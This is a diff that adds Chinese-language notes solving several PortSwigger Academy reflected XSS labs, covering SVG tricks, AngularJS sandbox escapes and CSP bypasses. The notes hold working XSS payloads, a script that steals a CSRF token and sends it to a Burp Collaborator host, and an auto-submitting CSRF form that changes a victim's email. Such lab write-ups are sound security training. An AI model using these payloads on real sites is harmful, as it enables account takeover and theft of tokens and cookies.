@@ -891,6 +891,164 @@ document.getElementById('searchMessage').innerText = message;
 類似 Python 的 f-string 方法來解
 
 
+## [Lab: Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
+### 題目敘述
+ This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..
+
+To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.
+
+Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
+`<a href="">Click me</a>`
+
+### 題目解釋
+SVG Attribute Click XSS
+
+### 解答
+
+首先發現 `svg` Tag 跟 `<a>` 都可以使用
+```html
+<svg><animate attributeName=x dur=1s repeatCount=2 />
+```
+
+接下來可以讓 svg 裡面出現一些文字
+```
+<svg><a><animate attributeName=x dur=1s repeatCount=2 /><text x=20 y=20>Click Me</text></a>
+```
+
+手動寫 Attribute Name 跟 hrefs
+
+```
+<svg><a><animate attributeName=href values="javascript:alert(1)" dur=1s repeatCount=2 /><text x=20 y=20>Click Me</text></a>
+```
+
+---
+
+以下題目有點無聊 QQ，還沒有認真研究
+
+## [Lab: Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
+### 題目敘述
+ This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 
+
+### 題目解釋
+N/A
+
+### 解答
+可以看出攻擊點是
+
+如果輸入 `https://acbb1f201ee33a64c059d28b009e00c9.web-security-academy.net/post?postId=5&123`
+
+```
+ <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26123'}).finally(_ => window.location = '/')">Back to Blog</a>
+```
+
+最終 Payload:
+
+```
+https://acbb1f201ee33a64c059d28b009e00c9.web-security-academy.net/post?postId=5&'},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
+```
+## [Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings)
+
+### 題目敘述
+ This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function. 
+### 題目解釋
+
+### 解答
+
+攻擊點
+```javascript=
+angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+$scope.query = {};
+var key = 'search';
+$scope.query[key] = '123';
+$scope.value = $parse(key)($scope.query);
+});
+```
 
 
+Payload
 
+```
+https://ac051fd81e10a67bc0a5302500f30066.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+## [Lab: Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp)
+### 題目敘述
+ This lab uses CSP and AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 
+### 題目解釋
+### 解答
+
+Payload
+
+```
+<script>
+location='https://acdb1f551ee495ccc01203c100ba0092.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+```
+
+## [Lab: Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
+### 題目敘述
+ This lab using a strict CSP that blocks outgoing requests to external web sites.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the CSP and exfiltrates the CSRF token using Burp Collaborator. You need to label your vector with the word "Click" in order to induce the simulated victim user to click it. For example:
+`<a href="">Click me</a>`
+
+### 題目解釋
+
+### 解答
+
+
+可以撿到 CSRF Token
+
+```
+<script>
+if(window.name) {
+        var re = /[A-Za-z0-9]{32}/;
+        var csrf_token = window.name.match(re)[0];
+	new Image().src='http://' +csrf_token + '.im8ye4hqxv6jyov53tornhnz9qfh36.burpcollaborator.net/?meow='+csrf_token;
+	} else {
+		location = 'https://ac2b1fc91e9da617c0d53285003500f9.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-ac431f951e74a6d7c0b9321201c000a1.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+```
+
+但要注意 DNS 不分大小寫 QQ
+
+Token : `Bl37LgBHPNCjyhmPRfrgyqZZtdQMX4oj`
+
+```
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://ac2b1fc91e9da617c0d53285003500f9.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;nets" />
+      <input type="hidden" name="csrf" value="Bl37LgBHPNCjyhmPRfrgyqZZtdQMX4oj" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+
+## [Lab: Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
+### 題目敘述
+ This lab uses CSP and contains a reflected XSS vulnerability.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.
+
+Please note that the intended solution to this lab is only possible in Chrome.
+### 題目解釋
+### 解答
+
+```
+https://acee1feb1f5b0d81c09e19f700e100ca.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+```
